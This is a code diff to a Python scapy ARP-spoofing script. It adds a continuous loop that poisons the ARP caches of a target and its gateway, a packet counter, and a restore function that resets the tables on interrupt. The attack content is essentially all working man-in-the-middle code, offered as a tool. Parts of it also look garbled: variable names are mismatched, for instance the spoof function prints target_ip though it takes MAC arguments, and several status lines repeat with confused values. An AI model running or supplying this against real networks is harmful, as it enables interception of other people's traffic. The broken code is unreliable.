@@ -1,5 +1,8 @@
+import sys
+import time
 import scapy.all as scapy
 import argparse
+
 
 def get_args():
     parser = argparse.ArgumentParser()
@@ -25,13 +28,33 @@ def spoof(target_mac, spoof_mac):
     print("[+] Sent ARP packet to " + spoof_mac + " with MAC address " + spoof_mac)
     print("[+] ARP spoofing is complete." + target_ip + " and " + spoof_mac)
     print("[+] Now you can send traffic to " + target_ip + " and " + spoof_mac)
-    print("[+] Now you can send traffic to " + spoof_ip + " and " + target_mac)
+    print("[+] Now you can send traffic to " + spoof_mac + " and " + target_mac)
     print("[+] Now you can send traffic to " + target_mac + " and " + spoof_mac)
     print("[+] Now you can send traffic to " + spoof_mac + " and " + target_mac)
-    
+
+def restore(destination_ip, source_ip):
+    destination = get_mac(destination_ip)
+    source = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination, psrc=source_ip, hwsrc=source)  
+    scapy.send(packet, count=4, verbose=False)  
+
 
 argument = get_args()
-while True:
-    spoof(argument.target, argument.gateway)
-    spoof(argument.gateway, argument.target)
+packets_sent = 0
+try:
+    while True:
+        spoof(argument.target, argument.gateway)
+        spoof(argument.gateway, argument.target)
+        packets_sent += 2
+        print("\r[+] Packets sent: " + str(packets_sent), end="")
+        sys.stdout.flush()
+        time.sleep(2)
 
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
+    restore(argument.target, argument.gateway)
+    restore(argument.gateway, argument.target)
+    print("[+] ARP tables have been reset. Quitting program.")
+    print("[+] Packets sent: " + str(packets_sent))
+    print("[+] Quitting program.")
+    exit()
